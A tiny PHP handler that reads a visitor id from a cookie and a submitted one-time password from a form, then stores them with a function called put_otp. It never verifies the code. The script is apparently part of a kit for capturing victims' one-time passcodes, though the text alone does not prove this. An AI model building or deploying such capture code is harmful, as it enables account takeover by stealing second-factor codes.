<?php 
require('../../machinne/include/setings.php');

$id = $_COOKIE['id'];
$otp = $_POST['otp'];
put_otp($id,$otp);
?>